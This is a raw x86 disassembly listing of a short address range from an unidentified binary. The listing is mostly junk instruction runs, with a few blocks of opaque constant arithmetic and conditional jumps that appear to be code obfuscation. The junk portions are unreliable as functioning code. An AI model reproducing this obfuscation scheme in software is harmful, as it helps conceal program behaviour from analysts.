  41844b:	mov    al,ds:0xd035d294
  418450:	push   ss
  418451:	dec    BYTE PTR [edi]
  418453:	in     eax,0x1f
  418455:	xchg   ebx,eax
  418456:	adc    DWORD PTR [edx+0x23],0xcf070d1f
  41845d:	push   ds
  41845e:	inc    ecx
  41845f:	mov    al,ds:0xaf9d5be
  418464:	int3   
  418465:	mov    eax,0xf7f95727
  41846a:	mov    ss,WORD PTR [esi+ebx*8]
  41846d:	mov    esp,0xa48d9c3b
  418472:	push   es
  418473:	cmp    ecx,DWORD PTR [ebx-0x6360ad58]
  418479:	mov    dl,0xc0
  41847b:	aas    
  41847c:	cmp    DWORD PTR [edi],0xb446b9f
  418482:	and    eax,0x3f26bace
  418487:	mov    bh,0x46
  418489:	push   0x89323ab1
  41848e:	xchg   edi,eax
  41848f:	sbb    ebx,DWORD PTR [esi]
  418491:	sub    bl,BYTE PTR [edx+edx*1-0x2b]
  418495:	stc    
  418496:	push   ss
  418497:	mov    al,ds:0xadb5b655
  41849c:	lahf   
  41849d:	add    DWORD PTR [esi+0x39e867c],ebp
  4184a3:	or     eax,ebp
  4184a5:	jl     0x418443
  4184a7:	cmp    esi,DWORD PTR [ecx]
  4184a9:	inc    ebx
  4184aa:	push   esp
  4184ab:	push   ebp
  4184ac:	les    ecx,FWORD PTR [esi-0x15]
  4184af:	pop    edx
  4184b0:	xchg   esp,eax
  4184b1:	add    dh,ch
  4184b3:	push   ds
  4184b4:	inc    edi
  4184b5:	dec    esi
  4184b6:	sar    BYTE PTR [esp+eax*1+0x45],1
  4184ba:	callw  0x476c
  4184be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184bf:	in     eax,0x2c
  4184c1:	dec    esi
  4184c2:	hlt    
  4184c3:	(bad)  
  4184c5:	push   cs
  4184c6:	push   ecx
  4184c7:	xor    dl,BYTE PTR [esi]
  4184c9:	mov    DWORD PTR [esp+0x34],0x4445
  4184d1:	mov    DWORD PTR [esp+0x10],0xa52
  4184d9:	mov    DWORD PTR [esp+0x14],0x1c69
  4184e1:	mov    eax,DWORD PTR [esp+0x10]
  4184e5:	mov    ecx,DWORD PTR [esp+0x14]
  4184e9:	mov    edx,DWORD PTR [esp+0x30]
  4184ed:	mov    ebx,DWORD PTR [esp+0x34]
  4184f1:	add    eax,0xffffd1a5
  4184f6:	adc    ecx,0xffffedf0
  4184fc:	xor    eax,edx
  4184fe:	xor    ecx,ebx
  418500:	and    eax,0x325d
  418505:	mov    DWORD PTR [esp+0x50],eax
  418509:	and    ecx,0x3544
  41850f:	mov    DWORD PTR [esp+0x54],ecx
  418513:	mov    DWORD PTR [esp+0x48],0x1704
  41851b:	mov    DWORD PTR [esp+0x4c],0x4a75
  418523:	mov    DWORD PTR [esp+0x30],0x985
  41852b:	mov    DWORD PTR [esp+0x34],0x341
  418533:	mov    DWORD PTR [esp+0x10],0x5aa9
  41853b:	mov    DWORD PTR [esp+0x14],0x221a
  418543:	mov    eax,DWORD PTR [esp+0x10]
  418547:	mov    ecx,DWORD PTR [esp+0x14]
  41854b:	mov    edx,DWORD PTR [esp+0x30]
  41854f:	mov    ebx,DWORD PTR [esp+0x34]
  418553:	push   ebx
  418554:	push   edx
  418555:	or     ecx,0xc32
  41855b:	or     eax,0x502a
  418560:	push   ecx
  418561:	push   eax
  418562:	call   0x41594e
  418567:	mov    ecx,DWORD PTR [esp+0x48]
  41856b:	mov    ebx,DWORD PTR [esp+0x4c]
  41856f:	sub    eax,ecx
  418571:	mov    ecx,DWORD PTR [esp+0x50]
  418575:	sbb    edx,ebx
  418577:	mov    ebx,DWORD PTR [esp+0x54]
  41857b:	cmp    ecx,eax
  41857d:	jne    0x41858b
  418583:	cmp    ebx,edx
  418585:	je     0x41a937
  41858b:	mov    DWORD PTR [esp+0x30],0x71ba
  418593:	mov    DWORD PTR [esp+0x34],0x5f78
  41859b:	mov    DWORD PTR [esp+0x10],0x7b9c
  4185a3:	mov    DWORD PTR [esp+0x14],0x5622
  4185ab:	mov    eax,DWORD PTR [esp+0x10]
  4185af:	mov    ecx,DWORD PTR [esp+0x14]
  4185b3:	mov    edx,DWORD PTR [esp+0x30]
  4185b7:	mov    ebx,DWORD PTR [esp+0x34]
  4185bb:	jmp    0x418818
  4185c0:	inc    edi
  4185c1:	pop    ebp
  4185c2:	sti    
  4185c3:	daa    
  4185c4:	sti    
  4185c5:	mov    ebx,0x271b9d9b
  4185ca:	mov    esp,0x9c68c2a4
  4185cf:	jecxz  0x4185ad
  4185d1:	out    dx,eax
  4185d2:	sar    BYTE PTR [esi-0x41413dcb],0x6
  4185d9:	push   esp
  4185da:	xor    BYTE PTR [edx-0x214ec3b3],dl
  4185e0:	jg     0x41856e
  4185e2:	(bad)  
  4185e3:	in     al,dx
  4185e4:	fwait
  4185e5:	and    al,0x4c
  4185e7:	sub    eax,DWORD PTR [ecx+0x3271c781]
  4185ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185ee:	add    edx,0x3880e6a3
  4185f4:	inc    edi
  4185f5:	dec    edi
  4185f6:	(bad)
  4185fa:	stc    
  4185fb:	pop    eax
  4185fc:	fwait
  4185fd:	and    eax,0x81e72e25
  418602:	jns    0x418627
  418604:	add    al,0x6e
  418606:	sbb    al,0x38
  418608:	xchg   ecx,eax
  418609:	mov    BYTE PTR [esp+eax*4-0x6],al
  41860d:	(bad)  
  41860e:	fadd   DWORD PTR [eax-0x62]
  418611:	inc    ecx
  418612:	std    
  418613:	and    eax,ebp
  418615:	xchg   edi,eax
  418616:	ret    
  418617:	fld    TBYTE PTR [esi+0x64]
  41861a:	pusha  
  41861b:	jo     0x418681
  41861d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41861e:	cli    
  41861f:	mov    dl,BYTE PTR [edx-0x43]
  418622:	xchg   esp,eax
  418623:	pop    ds
  418624:	enter  0x9d92,0x16
  418628:	add    al,0xf7
  41862a:	fisubr WORD PTR [ecx+0x70]
  41862d:	dec    esi
  41862e:	push   ecx
  41862f:	mov    edi,edi
  418631:	or     BYTE PTR [edi+0xd7f2313],dl
  418637:	fs jl  0x41864f
  41863a:	dec    edx
  41863b:	push   edx
  41863c:	cwde   
  41863d:	jmp    0x418647
  41863f:	aas    
  418640:	not    ebp
  418642:	push   ecx
  418643:	mov    edx,0x9eae37f8
  418648:	mov    DWORD PTR cs:[ecx],edi
  41864b:	inc    esp
  41864c:	popf   
  41864d:	mov    esp,0x92990663
  418652:	pop    ebp
  418653:	daa    
  418654:	push   esp
  418655:	cld    
  418656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418657:	out    0x48,al
  418659:	les    ebp,FWORD PTR [eax+eax*8-0x7ea9b483]
  418660:	add    DWORD PTR [eax+0x22],edx
  418663:	test   bl,0x67
  418666:	fsub   QWORD PTR [edi]
  418668:	enter  0x5d0c,0x8d
  41866c:	push   0xffffffac
  41866e:	stos   BYTE PTR es:[edi],al
  41866f:	mov    ds:0x68099c26,al
  418674:	sbb    ecx,DWORD PTR [ebx]
  418676:	pop    edi
  418677:	retf   
  418678:	sub    DWORD PTR [ebx+0x729c174c],0xb03c089d
  418682:	ins    DWORD PTR es:[edi],dx
  418683:	sub    bl,ah
  418685:	ins    DWORD PTR es:[edi],dx
  418686:	mov    edx,0xba45d7c7
  41868b:	mov    edx,0x5b4a8963
  418690:	pop    ds
  418691:	js     0x418632
  418693:	enter  0xd302,0x40
  418697:	out    0x7a,eax
  418699:	js     0x418701
  41869b:	in     eax,0xc
  41869d:	(bad)  
  41869e:	(bad)  
  41869f:	dec    ebx
  4186a0:	push   ebx
  4186a1:	inc    ebp
  4186a2:	or     cl,bh
  4186a4:	call   0x2ea83d0
  4186a9:	sbb    al,0x3f
  4186ab:	es push ss
  4186ad:	xchg   esi,eax
  4186ae:	jl     0x41869b
  4186b0:	(bad)  
  4186b1:	mov    al,0x8a
  4186b3:	adc    al,0xb
  4186b5:	add    ebp,0xe8b41d88
  4186bb:	popa   
  4186bc:	or     al,0x71
  4186be:	fs aas 
  4186c0:	cwde   
  4186c1:	jne    0x4186c5
  4186c3:	cdq    
  4186c4:	sbb    eax,DWORD PTR [eax-0x34135084]
  4186ca:	jo     0x418651
  4186cc:	das    
  4186cd:	jg     0x418705
  4186cf:	scas   al,BYTE PTR es:[edi]
  4186d0:	std    
  4186d1:	out    0x6e,eax
  4186d3:	and    ch,BYTE PTR [ecx-0x5f07c850]
  4186d9:	cmc    
  4186da:	xchg   ebp,eax
  4186db:	adc    al,0xa4
  4186dd:	daa    
  4186de:	push   cs
  4186df:	dec    edx
  4186e0:	cmp    bh,BYTE PTR [eax+0x43]
  4186e3:	lds    edi,FWORD PTR [edi]
  4186e5:	inc    ebx
  4186e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186e7:	bound  esi,QWORD PTR [edx]
  4186e9:	lods   eax,DWORD PTR ds:[esi]
  4186ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186eb:	ins    BYTE PTR es:[edi],dx
  4186ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186ed:	outs   dx,DWORD PTR ds:[esi]
  4186ee:	mov    ebp,0xebe3b9e7
  4186f3:	add    BYTE PTR [edi],ah
  4186f5:	sbb    dh,ch
  4186f7:	sub    eax,0x896bff9b
  4186fc:	xchg   DWORD PTR [ecx],ebp
  4186fe:	inc    edi
  4186ff:	and    al,0x4b
  418701:	outs   dx,BYTE PTR ds:[esi]
  418702:	(bad)  [ebp+eiz*2-0x7d]
  418706:	jp     0x41873f
  418708:	mov    eax,ds:0x98df87b3
  41870d:	loope  0x41872b
  41870f:	jne    0x41877f
  418711:	push   ebp
  418712:	or     eax,ecx
  418714:	sub    eax,ebp
  418716:	cdq    
  418717:	mov    DWORD PTR [edi+edx*8-0x60],esi
  41871b:	scas   eax,DWORD PTR es:[edi]
  41871c:	fcomi  st,st(7)
  41871e:	cmp    esi,ebp
  418720:	jne    0x4186ad
  418722:	out    0xd3,al
  418724:	jge    0x418738
  418726:	or     eax,0xcf4c9333
  41872b:	pop    ds
  41872c:	test   BYTE PTR [ebx-0x1e5c0cb4],cl
  418732:	mov    BYTE PTR [edi],bl
  418734:	push   ebx
  418735:	sbb    bh,BYTE PTR [edi]
  418737:	(bad)  [ecx]
  418739:	mov    dh,0x67
  41873b:	mov    cl,0x4e
  41873d:	retf   0xe144
  418740:	mov    eax,ds:0xe8ff7c12
  418745:	not    DWORD PTR ds:0x17b2b1e6
  41874b:	stos   BYTE PTR es:[edi],al
  41874c:	rol    BYTE PTR [esi-0x3703a6ad],cl
  418752:	lods   eax,DWORD PTR ds:[esi]
  418753:	xor    eax,DWORD PTR [ecx-0x427df596]
  418759:	pop    esi
  41875a:	inc    ecx
  41875b:	imul   esi,eax,0x11
  41875e:	mov    esi,0x515e1c9e
  418763:	add    DWORD PTR [eax],ebp
  418765:	push   es
  418766:	imul   edx,DWORD PTR [edi],0x663171e3
  41876c:	mov    cl,0xd6
  41876e:	push   ecx
  41876f:	repz dec ebx
  418771:	sbb    al,0xc9
  418773:	call   0x4e159a03
  418778:	jle    0x4187f0
  41877a:	dec    ebx
  41877b:	dec    edi
  41877c:	shl    DWORD PTR [edx],cl
  41877e:	mov    eax,ds:0x36f27753
  418783:	scas   al,BYTE PTR es:[edi]
  418784:	inc    edx
  418785:	std    
  418786:	mov    ds:0xf8d888d6,eax
  41878b:	mov    ecx,0x24a80d51
  418790:	scas   al,BYTE PTR es:[edi]
  418791:	and    eax,DWORD PTR [ebx+0x3898809a]
  418797:	or     al,0xea
  418799:	ficom  WORD PTR ss:0x67373f08
  4187a0:	mov    edx,0x50e9d4bf
  4187a5:	mov    bl,0xd7
  4187a7:	in     eax,dx
  4187a8:	call   0x89445994
  4187ad:	xchg   ebx,eax
  4187ae:	out    dx,eax
  4187af:	pop    ecx
  4187b0:	(bad)  
  4187b1:	sbb    al,0x4
  4187b3:	out    dx,eax
  4187b4:	push   ss
  4187b5:	xor    BYTE PTR [ebx+0x4f],0xb8
  4187b9:	in     eax,dx
  4187ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187bb:	jbe    0x4187ce
  4187bd:	pop    ss
  4187be:	test   dh,0x60
  4187c1:	cmp    BYTE PTR [edi+edi*2-0x470561b7],dl
  4187c8:	cmp    DWORD PTR [edi],0x30cdb01
  4187ce:	dec    eax
  4187cf:	jbe    0x4187b6
  4187d1:	cld    
  4187d2:	xlat   BYTE PTR ds:[ebx]
  4187d3:	push   0x79a5b02d
  4187d8:	inc    edi
  4187d9:	std    
  4187da:	sbb    DWORD PTR [ebx-0x70bb1a73],edi
  4187e0:	and    BYTE PTR [esi+0x6c574185],dl
  4187e6:	inc    BYTE PTR [edx+edi*1]
  4187e9:	adc    eax,0xd9accbda
  4187ee:	dec    eax
  4187ef:	cmp    eax,0x55ddd55c
  4187f4:	push   eax
  4187f5:	mov    eax,0x2232752a
  4187fa:	out    dx,al
  4187fb:	or     ebx,DWORD PTR [ecx-0x6f]
  4187fe:	adc    ebx,ecx
  418800:	fsub   st(3),st
  418802:	dec    edi
  418803:	shl    DWORD PTR [eax-0x587691d8],0x9e
  41880a:	push   edi
  41880b:	jge    0x418847
  41880d:	lahf   
  41880e:	mov    ds:0x2bd3a92b,eax
  418813:	call   0xc11c38ef
  418818:	add    eax,0x3646
  41881d:	adc    ecx,0x7ace
  418823:	xor    eax,0x3e2e
  418828:	xor    ecx,0x4b71
  41882e:	and    eax,edx
  418830:	mov    DWORD PTR [esp+0x88],eax
  418837:	and    ecx,ebx
  418839:	mov    DWORD PTR [esp+0x8c],ecx
  418840:	mov    DWORD PTR [esp+0x50],0x18d6
  418848:	mov    DWORD PTR [esp+0x54],0x2bb4
  418850:	mov    DWORD PTR [esp+0x48],0x14
  418858:	mov    DWORD PTR [esp+0x4c],0x0
  418860:	mov    DWORD PTR [esp+0x30],0x1
  418868:	mov    DWORD PTR [esp+0x34],0x0
  418870:	mov    DWORD PTR [esp+0x10],0xa87
  418878:	mov    DWORD PTR [esp+0x14],0x7fd9
  418880:	jmp    0x418add
  418885:	mov    dh,0xe5
  418887:	jmp    0x836c:0xb814b913
  41888e:	adc    DWORD PTR [esi+0x28088690],ebx
  418894:	rcl    DWORD PTR [ebx-0xd],1
  418897:	sar    BYTE PTR [esi-0x41413dcb],0x35
  41889e:	into   
  41889f:	pop    esi
  4188a0:	fld    TBYTE PTR [ebx+eiz*4+0x57895f0d]
  4188a7:	mov    dh,0xf2
  4188a9:	adc    DWORD PTR [edi],esp
  4188ab:	sahf   
  4188ac:	push   edx
  4188ad:	inc    esi
  4188ae:	pop    edi
  4188af:	push   cs
  4188b0:	and    BYTE PTR cs:[ebx-0x5d2ce655],bh
  4188b7:	repnz loopne 0x41888d
  4188ba:	fld    QWORD PTR [edx+0x1dbd27bd]
  4188c0:	push   edx
  4188c1:	sub    dh,bl
  4188c3:	dec    edi
  4188c4:	adc    BYTE PTR [ebp+ecx*4-0x1903bb54],al
  4188cb:	out    0xf1,al
  4188cd:	out    0xf8,eax
  4188cf:	cmp    ecx,DWORD PTR [edi+0x18]
  4188d2:	ss dec ecx
  4188d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188d5:	add    DWORD PTR [eax],esi
  4188d7:	push   ebx
  4188d8:	mov    bl,0x99
  4188da:	mov    eax,ds:0x5dc8c652
  4188df:	loope  0x418920
  4188e1:	mov    ebp,0xd5ba5a29
  4188e6:	imul   esp,DWORD PTR [eax-0x6168a476],0xf8737f43
  4188f0:	out    dx,eax
  4188f1:	les    ebp,FWORD PTR [edi]
  4188f3:	sti    
  4188f4:	(bad)  
  4188f5:	mov    ss,WORD PTR [ecx+ebp*2]
  4188f8:	mov    ah,0x4f
  4188fa:	xor    eax,DWORD PTR [esi-0x39f467e7]
  418900:	mul    BYTE PTR [edx-0x22]
  418903:	ins    BYTE PTR es:[edi],dx
  418904:	adc    dh,BYTE PTR fs:[edx]
  418907:	popa   
  418908:	cmp    al,0xaa
  41890a:	sti    
  41890b:	test   al,0xe9
  41890d:	cmp    BYTE PTR [ebx+0x4724905b],dh
  418913:	in     ax,dx
  418915:	pop    esp
  418916:	es je  0x418976
  418919:	ja     0x418969
  41891b:	adc    eax,0xc3da7be7
  418920:	mov    esi,0x1f0b05be
  418925:	imul   esp,DWORD PTR [ebp-0x5c],0xfbdf9b19
  41892c:	pop    esi
  41892d:	outs   dx,DWORD PTR ds:[esi]
  41892e:	(bad)  
  41892f:	shr    BYTE PTR [esi],cl
  418931:	jne    0x418915
  418933:	cli    
  418934:	sbb    DWORD PTR [edi-0x33],edi
  418937:	test   al,0x4c
  418939:	push   ebx
  41893a:	xchg   DWORD PTR [edi-0x3f],ecx
  41893d:	ds int 0xcb
  418940:	repnz inc eax
  418942:	lds    ebp,FWORD PTR [edx]
  418944:	cs pop eax
  418946:	pop    esp
  418947:	cmp    ecx,DWORD PTR [esi+edi*2]
  41894a:	push   ebx
  41894b:	test   eax,esi
  41894d:	cmp    eax,0xa04b8938
  418952:	ret    0x1a19
  418955:	popf   
  418956:	sub    DWORD PTR [edi-0x72],edi
  418959:	xor    BYTE PTR [ecx+eiz*2],bl
  41895c:	xor    BYTE PTR [esi+0x8],ah
  41895f:	or     BYTE PTR [ebp+0x24],al
  418962:	out    0x19,eax
  418964:	mov    eax,ds:0x783773fd
  418969:	jl     0x4189a4
  41896b:	cli    
  41896c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41896d:	xlat   BYTE PTR ds:[ebx]
  41896e:	push   eax
  41896f:	pusha  
  418970:	clc    
  418971:	mov    ah,0x43
  418973:	cmp    DWORD PTR [eax+0x1d],ebx
  418976:	scas   al,BYTE PTR es:[edi]
  418977:	mov    BYTE PTR [eax+0x4f],al
  41897a:	sbb    DWORD PTR [ebx-0x14],ebp
  41897d:	das    
  41897e:	add    al,0xf9
  418980:	call   0xad71a0ee
  418985:	data16 fist DWORD PTR [edi-0x52214ad5]
  41898c:	pop    eax
  41898d:	jb     0x418960
  41898f:	cwde   
  418990:	adc    ebp,DWORD PTR ds:0x6effea41
  418996:	mov    ebx,0xe58978ae
  41899b:	imul   esi,esi,0x783eff03
  4189a1:	fs sahf 
  4189a3:	xchg   esp,eax
  4189a4:	out    dx,al
  4189a5:	test   eax,0xeea40095
  4189aa:	mov    al,ds:0x6a1871dd
  4189af:	sub    BYTE PTR gs:[edx+0x495fc641],al
  4189b6:	pop    ecx
  4189b7:	jb     0x4189db
  4189b9:	cmp    al,0x6d
  4189bb:	dec    eax
  4189bc:	imul   esi,DWORD PTR [eax],0xffffffa0
  4189bf:	mov    edx,DWORD PTR [esp+edx*4]
  4189c2:	push   ds
  4189c3:	pop    ss
  4189c4:	push   es
  4189c5:	sub    DWORD PTR [eax],ebx
  4189c7:	xchg   ebp,eax
  4189c8:	sbb    BYTE PTR [edx],bh
  4189ca:	inc    eax
  4189cb:	rcl    BYTE PTR [eax+ebp*2],1
  4189ce:	mov    edx,0x34e5d4
  4189d3:	and    eax,0x2fa33c2f
  4189d8:	(bad)  
  4189d9:	call   0x618cab68
  4189de:	inc    ebp
  4189df:	pushf  
  4189e0:	nop
  4189e1:	outs   dx,DWORD PTR ds:[esi]
  4189e2:	shl    BYTE PTR [ebp+edi*2+0x49c88adc],0x64
  4189ea:	add    al,0x78
  4189ec:	xor    ah,BYTE PTR [esi-0x24584928]
  4189f2:	pusha  
  4189f3:	mov    ds:0x65fc6860,al
  4189f8:	jo     0x41897f
  4189fa:	pop    ecx
  4189fb:	cwde   
  4189fc:	test   eax,0x8c969b11
  418a01:	je     0x4189f2
  418a03:	xchg   ebx,eax
  418a04:	ja     0x4189c5
  418a06:	mul    DWORD PTR [eax+0x73e10bb8]
  418a0c:	jmp    0xcea3:0xb27d77b6
  418a13:	ds mov edx,0x2562e91f
  418a19:	not    cl
  418a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a1c:	sub    al,0x60
  418a1e:	addr16 sahf 
  418a20:	(bad)  
  418a21:	leave  
  418a22:	out    0xca,eax
  418a24:	xchg   esp,eax
  418a25:	push   edi
  418a26:	icebp  
  418a27:	mov    esp,0x595ca8c9
  418a2c:	dec    esi
  418a2d:	mov    al,0x67
  418a2f:	ret    0xad93
  418a32:	pop    ecx
  418a33:	or     eax,0x25dacd32
  418a38:	adc    edx,edi
  418a3a:	jl     0x418a51
  418a3c:	(bad)  
  418a3d:	push   ds
  418a3e:	int    0xde
  418a40:	lahf   
  418a41:	dec    esi
  418a42:	dec    eax
  418a43:	push   0x9
  418a45:	and    al,0xed
  418a47:	and    BYTE PTR [ebx+0x1b],ch
  418a4a:	fisubr WORD PTR [eax-0x48ccd27d]
  418a50:	popf   
  418a51:	out    0x70,al
  418a53:	sub    edx,DWORD PTR [edi+0x7838329d]
  418a59:	pop    edi
  418a5a:	mov    dh,0x51
  418a5c:	mov    eax,0x898f64ea
  418a61:	gs xor esi,eax
  418a64:	test   DWORD PTR [esi-0x56],ebp
  418a67:	leave  
  418a68:	pusha  
  418a69:	and    DWORD PTR [edi+0x2c],ecx
  418a6c:	cmp    al,0x1f
  418a6e:	inc    ebx
  418a6f:	mov    dh,0x38
  418a71:	and    ah,dh
  418a73:	dec    edx
  418a74:	(bad)  
  418a75:	call   0x8407bc08
  418a7a:	out    dx,al
  418a7b:	xor    eax,0x23f270e1
  418a80:	iret   
  418a81:	in     eax,dx
  418a82:	mov    dl,0x41
  418a84:	push   0x251e98ed
  418a89:	out    dx,eax
  418a8a:	cmp    dh,BYTE PTR [ebp-0x5122146c]
  418a90:	repz mov al,ds:0x51d4da51
  418a96:	test   DWORD PTR [ebp-0x1535598b],ebx
  418a9c:	or     ah,BYTE PTR ds:0x9d21834d
  418aa2:	push   0x60
  418aa4:	js     0x418acd
  418aa6:	ins    BYTE PTR es:[edi],dx
  418aa7:	jg     0x418b0e
  418aa9:	add    DWORD PTR [eax-0x13],edx
  418aac:	(bad)  
  418aad:	jns    0x418a80
  418aaf:	inc    edx
  418ab0:	clc    
  418ab1:	xor    ebx,DWORD PTR [eax]
  418ab3:	pop    esp
  418ab4:	call   0xdb5b4e21
  418ab9:	fcom   DWORD PTR [ebp+0x7965e368]
  418abf:	xor    eax,0xfa484c3
  418ac4:	sub    DWORD PTR [ecx],edi
  418ac6:	call   0x31d1:0x4fe76a5b
  418acd:	cmp    ch,BYTE PTR ds:0x4ad48fd0
  418ad3:	sub    al,0x3c
  418ad5:	fstp   TBYTE PTR [ebx-0x36]
  418ad8:	cmp    esi,ecx
  418ada:	xchg   ecx,eax
  418adb:	outs   dx,BYTE PTR ds:[esi]
  418adc:	bound  ecx,QWORD PTR [ebx-0x74efdbbc]
  418ae2:	dec    esp
  418ae3:	and    al,0x14
  418ae5:	push   0x2
  418ae7:	push   0x7f349462
  418aec:	xor    ecx,0x3601
  418af2:	xor    eax,0x5491
  418af7:	push   ecx
  418af8:	push   eax
  418af9:	call   0x422283
  418afe:	mov    ecx,DWORD PTR [esp+0x30]
  418b02:	mov    ebx,DWORD PTR [esp+0x34]
  418b06:	push   ebx
  418b07:	push   ecx
  418b08:	push   edx
  418b09:	push   eax
  418b0a:	call   0x422283
  418b0f:	mov    ecx,DWORD PTR [esp+0x48]
  418b13:	mov    ebx,DWORD PTR [esp+0x4c]
  418b17:	jmp    0x418d74
  418b1c:	jp     0x418ac4
  418b1e:	cld    
  418b1f:	dec    eax
  418b20:	cmp    al,0x9c
  418b22:	jp     0x418ae0
  418b24:	js     0x418b9b
  418b26:	push   esp
  418b27:	sahf   
  418b28:	push   es
  418b29:	jo     0x418afe
  418b2b:	nop
  418b2c:	retf   
  418b2d:	test   eax,0xbec235be
  418b33:	mov    esi,0xc40fb037
  418b38:	arpl   WORD PTR [esi+eax*1+0x3c36d101],bp
  418b3f:	or     esp,DWORD PTR [edi+eiz*8]
  418b42:	jmp    0x696a228c
  418b47:	pop    ebx
  418b48:	sbb    eax,0xf3a73490
  418b4d:	scas   eax,DWORD PTR es:[edi]
  418b4e:	and    bh,dl
  418b50:	adc    eax,DWORD PTR [eax-0xa2e715f]
  418b56:	push   0xffffffcd
  418b58:	add    eax,DWORD PTR [esi]
  418b5a:	mov    dl,0x3d
  418b5c:	je     0x418afa
  418b5e:	fisttp WORD PTR [eax+0x28]
  418b61:	scas   al,BYTE PTR es:[edi]
  418b62:	ror    DWORD PTR [esi-0x79],0xce
  418b66:	dec    edx
  418b67:	out    0x20,al
  418b69:	pop    es
  418b6a:	jo     0x418ba4
  418b6c:	add    esp,DWORD PTR [edi]
  418b6e:	fstp   TBYTE PTR [esp+eax*4+0x5d6f1b9f]
  418b75:	lock inc esp
  418b77:	xchg   edi,eax
  418b78:	pop    esi
  418b79:	fidivr DWORD PTR ds:0xc59da841
  418b7f:	mov    ah,0xda
  418b81:	push   ebp
  418b82:	test   BYTE PTR [ebp-0x15c8a9c2],0x9
  418b89:	inc    ecx
  418b8a:	rcl    BYTE PTR [eax+ecx*8-0x72],cl
  418b8e:	cmp    DWORD PTR [ecx-0x3a],esi
  418b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b92:	push   es
  418b93:	jge    0x418b60
  418b95:	pop    es
  418b96:	lds    edi,FWORD PTR [edx]
  418b98:	fidivr DWORD PTR [ecx]
  418b9a:	xchg   esp,eax
  418b9b:	shl    ecx,cl
  418b9d:	pop    ebx
  418b9e:	sar    esi,1
  418ba0:	inc    esp
  418ba1:	push   es
  418ba2:	dec    ebx
  418ba3:	and    DWORD PTR [bp+di+0xc],ebx
  418ba7:	ror    BYTE PTR [esi+0x5d],0x6
  418bab:	dec    ebp
  418bac:	mov    bh,0x56
  418bae:	cmp    al,0x17
  418bb0:	pop    ecx
  418bb1:	dec    ebp
  418bb2:	(bad)  
  418bb3:	lods   al,BYTE PTR ds:[esi]
  418bb4:	sbb    cl,cl
  418bb6:	mov    ax,0xe40b
  418bba:	and    eax,0x124b2f2b
  418bbf:	push   eax
  418bc0:	fadd   st(0),st
  418bc2:	imul   ecx,ebx,0xee97f3ac
  418bc8:	push   ds
  418bc9:	scas   al,BYTE PTR es:[edi]
  418bca:	push   0xc43c41a5
  418bcf:	push   esi
  418bd0:	jp     0x418bd7
  418bd2:	stos   DWORD PTR es:[edi],eax
  418bd3:	ins    DWORD PTR es:[edi],dx
  418bd4:	shr    BYTE PTR [edx],cl
  418bd6:	dec    eax
  418bd7:	push   ebx
  418bd8:	outs   dx,BYTE PTR ds:[esi]
  418bd9:	or     ch,BYTE PTR [esi-0x58d2bcba]
  418bdf:	sbb    eax,DWORD PTR [edx+0x35ab38ab]
  418be5:	mov    esp,0xdfe1edd
  418bea:	in     eax,0x93
  418bec:	or     BYTE PTR [edi+0x195a95a4],0x7c
  418bf3:	ja     0x418bc8
  418bf5:	inc    edx
  418bf6:	fdivr  QWORD PTR [edi+0x27]
  418bf9:	or     BYTE PTR [ebp+0x1c],bh
  418bfc:	add    ebp,DWORD PTR [ebp-0x50]
  418bff:	mov    edi,0xb20a883
  418c04:	xchg   esi,eax
  418c05:	hlt    
  418c06:	cwde   
  418c07:	mov    ah,0x61
  418c09:	fwait
  418c0a:	push   ebp
  418c0b:	push   esi
  418c0c:	outs   dx,BYTE PTR cs:[esi]
  418c0e:	dec    eax
  418c0f:	adc    cl,al
  418c11:	ins    DWORD PTR es:[edi],dx
  418c12:	jns    0x418bda
  418c14:	jo     0x418c8b
  418c16:	stos   DWORD PTR es:[edi],eax
  418c17:	stos   DWORD PTR es:[edi],eax
  418c18:	dec    ebx
  418c19:	icebp  
  418c1a:	mov    bh,0x3f
  418c1c:	loope  0x418c39
  418c1e:	daa    
  418c1f:	mov    edx,0x2c5eb5db
  418c24:	and    al,0x48
  418c27:	lahf   
  418c28:	out    0x65,eax
  418c2a:	or     al,0x4e
  418c2c:	ror    esp,1
  418c2e:	adc    al,0x73
  418c30:	cmp    eax,0xd28791bc
  418c35:	pop    ebx
  418c36:	fisub  WORD PTR [esi]
  418c38:	push   es
  418c39:	sub    edi,ecx
  418c3b:	test   al,0x1
  418c3d:	sahf   
  418c3e:	cmp    DWORD PTR [ebx-0x27e033cd],0xbcd2c9
  418c48:	mov    ah,0x92
  418c4a:	nop
  418c4b:	aas    
  418c4c:	test   eax,0x17baeebf
  418c51:	retf   0xa2d7
  418c54:	jmp    0x418be8
  418c56:	add    eax,0x4ec77529
  418c5b:	stos   BYTE PTR es:[edi],al
  418c5c:	and    ebp,eax
  418c5e:	inc    ecx
  418c5f:	sahf   
  418c60:	out    dx,al
  418c61:	imul   esi,esp,0xffffffee
  418c64:	xor    ebx,DWORD PTR [ebx-0x47]
  418c67:	scas   al,BYTE PTR es:[edi]
  418c68:	pop    esi
  418c69:	or     edi,DWORD PTR [ecx]
  418c6b:	pop    ebx
  418c6c:	imul   esi,DWORD PTR [ecx-0x7976ffa6],0xffffffa4
  418c73:	fisub  DWORD PTR [ecx]
  418c75:	pop    edx
  418c76:	repnz mov cs,WORD PTR [esi]
  418c79:	push   esp
  418c7a:	jmp    0xfa8483ee
  418c7f:	imul   esp,DWORD PTR [edx+eax*4],0x527d19b9
  418c86:	out    0x24,al
  418c88:	cld    
  418c89:	sahf   
  418c8a:	rcl    DWORD PTR [ebp-0x2],0x9
  418c8e:	cmp    BYTE PTR [eax-0x4ccd14e1],dh
  418c94:	xchg   edx,eax
  418c95:	inc    esi
  418c96:	or     dh,BYTE PTR [ecx-0x7284a3c7]
  418c9c:	in     al,dx
  418c9d:	pop    es
  418c9e:	or     al,0x6e
  418ca0:	push   esp
  418ca1:	outs   dx,BYTE PTR ds:[esi]
  418ca2:	sub    al,0xc6
